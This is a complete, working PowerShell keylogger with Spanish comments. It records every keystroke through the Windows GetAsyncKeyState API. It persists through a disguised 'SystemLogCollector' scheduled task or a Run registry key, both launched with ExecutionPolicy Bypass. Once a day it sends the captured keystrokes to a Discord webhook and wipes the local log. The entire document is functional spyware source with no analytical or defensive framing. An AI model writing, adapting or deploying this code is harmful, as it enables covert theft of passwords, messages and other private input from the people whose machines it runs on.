# Configuración
$logFile = "C:\Users\marco\OneDrive\Escritorio\logg\log.dat"
$webhookUrl = $env:DISCORD_WEBHOOK
$taskName = "SystemLogCollector"
$sendTimeHour = 17
$sendTimeMinuteStart = 0
$sendTimeMinuteEnd = 1
$sentToday = $false

# Copiar script para persistencia
$scriptPath = "C:\Users\marco\OneDrive\Escritorio\logg\logger.ps1"
try {
    if (-not [string]::IsNullOrEmpty($PSCommandPath) -and $PSCommandPath -ne $scriptPath) {
        Copy-Item $PSCommandPath $scriptPath -Force -ErrorAction Stop
        Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Script copiado a $scriptPath a $(Get-Date)" -ErrorAction Stop
    } else {
        Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Script ya en $scriptPath o ejecutado interactivamente a $(Get-Date)" -ErrorAction Stop
    }
} catch {
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Copia de script falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
}

# Crear directorio de logs con fallback
$logDir = Split-Path $logFile -Parent
try {
    if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force -ErrorAction Stop | Out-Null }
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Directorio creado: $logDir a $(Get-Date)" -ErrorAction Stop
} catch {
    $logFile = "$env:TEMP\log.dat"
    $logDir = $env:TEMP
    try { 
        New-Item -ItemType Directory -Path $logDir -Force -ErrorAction Stop | Out-Null 
        Add-Content -Path "$env:TEMP\debug.txt" -Value "[INFO] Fallback a TEMP: $logDir a $(Get-Date)" -ErrorAction Stop
    } catch {
        Add-Content -Path "$env:TEMP\error.txt" -Value "[ERROR] Fallback a TEMP falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
    }
}

# Log inicial
try { 
    Add-Content -Path $logFile -Value "[INFO] Script iniciado a $(Get-Date)" -ErrorAction Stop 
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Log inicial escrito a $(Get-Date)" -ErrorAction Stop
} catch { 
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Log inicial falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
}
try { 
    New-Item -Path "C:\Users\marco\OneDrive\Escritorio\logg\logger_started.txt" -ItemType File -Force -ErrorAction Stop | Out-Null 
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Archivo logger_started.txt creado a $(Get-Date)" -ErrorAction Stop
} catch { 
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Creación de logger_started.txt falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
}

# Mapa de teclas
$keyMap = @{
    8='[BACKSPACE]'; 9='[TAB]'; 13='[ENTER]'; 16='[SHIFT]'; 17='[CTRL]'; 18='[ALT]';
    27='[ESC]'; 32=' '; 48='0'; 49='1'; 50='2'; 51='3'; 52='4'; 53='5'; 54='6'; 55='7'; 56='8'; 57='9';
    65='A'; 66='B'; 67='C'; 68='D'; 69='E'; 70='F'; 71='G'; 72='H'; 73='I'; 74='J'; 75='K'; 76='L'; 77='M';
    78='N'; 79='O'; 80='P'; 81='Q'; 82='R'; 83='S'; 84='T'; 85='U'; 86='V'; 87='W'; 88='X'; 89='Y'; 90='Z';
    186=';'; 187='='; 188=','; 189='-'; 190='.'; 191='/'; 192='`'; 219='['; 220='\'; 221=']'; 222="'"
}

# Función para enviar a Discord
function Send-ToDiscord {
    param($Content)
    if (-not $webhookUrl) {
        try { Add-Content -Path $logFile -Value "[ERROR] Webhook no configurado a $(Get-Date)" -ErrorAction Stop } catch {}
        return
    }
    $chunks = if ($Content.Length -gt 2000) { [regex]::Split($Content, '(?<=.{2000})') } else { @($Content) }
    foreach ($chunk in $chunks) {
        $cleanChunk = $chunk -replace '```', '\`\`\`' -replace '[^\x00-\x7F]', '?'
        $body = @{ content = $cleanChunk } | ConvertTo-Json
        $maxRetries = 3
        $retryCount = 0
        while ($retryCount -lt $maxRetries) {
            try {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
                $proxy = [System.Net.WebRequest]::DefaultWebProxy
                $params = @{
                    Uri = $webhookUrl
                    Method = 'Post'
                    Body = $body
                    ContentType = 'application/json'
                    ErrorAction = 'Stop'
                }
                if ($proxy) { $params.Proxy = $proxy }
                Invoke-RestMethod @params
                try { Add-Content -Path $logFile -Value "[INFO] Enviado a Discord a $(Get-Date)" -ErrorAction Stop } catch {}
                try { Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Enviado a Discord a $(Get-Date)" -ErrorAction Stop } catch {}
                break
            } catch {
                $retryCount++
                try { Add-Content -Path $logFile -Value "[ERROR] Intento $retryCount de $maxRetries falló: $_ a $(Get-Date)" -ErrorAction Stop } catch {}
                try { Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Intento $retryCount de $maxRetries falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue } catch {}
                if ($retryCount -eq $maxRetries) {
                    try { Add-Content -Path $logFile -Value "[ERROR] No se pudo enviar tras $maxRetries intentos a $(Get-Date)" -ErrorAction Stop } catch {}
                    try { Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] No se pudo enviar tras $maxRetries intentos a $(Get-Date)" -ErrorAction Stop } catch {}
                    break
                }
                Start-Sleep -Seconds (5 * [math]::Pow(2, $retryCount-1))
            }
        }
    }
}

# Configurar persistencia
try {
    $taskExists = Get-ScheduledTask -TaskName $taskName -ErrorAction Stop
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Verificación de tarea completada: $(if ($taskExists) {'Tarea existe'} else {'Tarea no existe'}) a $(Get-Date)" -ErrorAction Stop
} catch { 
    $taskExists = $null 
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Verificación de tarea falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
}
if (-not $taskExists) {
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `\"$scriptPath`\"" -ErrorAction Stop
        $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME -ErrorAction Stop
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ErrorAction Stop
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Description "Recopila datos del sistema al iniciar sesión" -Force -ErrorAction Stop | Out-Null
        Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Tarea programada creada a $(Get-Date)" -ErrorAction Stop
    } catch {
        try { 
            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $taskName -Value "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `\"$scriptPath`\"" -ErrorAction Stop 
            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Entrada de registro creada a $(Get-Date)" -ErrorAction Stop
        } catch {
            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Persistencia falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
        }
    }
}

# Capturar pulsaciones
try {
    Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@ -ErrorAction Stop
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Add-Type ejecutado a $(Get-Date)" -ErrorAction Stop
} catch {
    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Add-Type falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue
}
$logBuffer = @()
$lastKeyStates = @{}
while ($true) {
    Start-Sleep -Milliseconds 60
    $shift = [Keyboard]::GetAsyncKeyState(160) -eq -32767 -or [Keyboard]::GetAsyncKeyState(161) -eq -32767
    $ctrl = [Keyboard]::GetAsyncKeyState(162) -eq -32767 -or [Keyboard]::GetAsyncKeyState(163) -eq -32767
    $alt = [Keyboard]::GetAsyncKeyState(164) -eq -32767 -or [Keyboard]::GetAsyncKeyState(165) -eq -32767
    foreach ($i in (8..90 + 96..122 + 186..222)) {
        $keyState = [Keyboard]::GetAsyncKeyState($i)
        if ($keyState -eq -32767 -and $lastKeyStates[$i] -ne -32767) {
            $prefix = if ($shift) { "[SHIFT+]" } elseif ($ctrl) { "[CTRL+]" } elseif ($alt) { "[ALT+]" } else { "" }
            $char = if ($keyMap.ContainsKey($i)) { $keyMap[$i] } else { "[UNK+$i]" }
            $log = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss'): $prefix$char"
            $logBuffer += $log
            if ($logBuffer.Count -ge 10) {
                try { 
                    Add-Content -Path $logFile -Value $logBuffer -ErrorAction Stop 
                    $logBuffer = @() 
                    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Log escrito a $logFile a $(Get-Date)" -ErrorAction Stop
                } catch { 
                    Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Escritura de log falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
                }
            }
        }
        $lastKeyStates[$i] = $keyState
    }
    if ($logBuffer.Count -gt 0 -and ((Get-Date) -gt (Get-Date).Date.AddDays(1))) {
        try { 
            Add-Content -Path $logFile -Value $logBuffer -ErrorAction Stop 
            $logBuffer = @() 
            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Buffer vaciado a $(Get-Date)" -ErrorAction Stop
        } catch { 
            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Vaciado de buffer falló: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
        }
    }
    $currentTime = Get-Date
    if ($currentTime.Hour -eq $sendTimeHour -and $currentTime.Minute -ge $sendTimeMinuteStart -and $currentTime.Minute -lt $sendTimeMinuteEnd -and (Test-Path $logFile) -and -not $sentToday) {
        try {
            $content = Get-Content -Path $logFile -Raw -ErrorAction Stop
            if ($content) {
                Send-ToDiscord -Content $content
                Clear-Content -Path $logFile -ErrorAction Stop
                $sentToday = $true
                Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] Log enviado y limpiado a $(Get-Date)" -ErrorAction Stop
            } else {
                Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\debug.txt" -Value "[INFO] No hay contenido para enviar a Discord a $(Get-Date)" -ErrorAction Stop
            }
        } catch { 
            Add-Content -Path "C:\Users\marco\OneDrive\Escritorio\logg\error.txt" -Value "[ERROR] Fallo en envío o limpieza: $_ a $(Get-Date)" -ErrorAction SilentlyContinue 
        }
    }
    if ($currentTime.Hour -eq 0 -and $currentTime.Minute -eq 0) { $sentToday = $false }
}
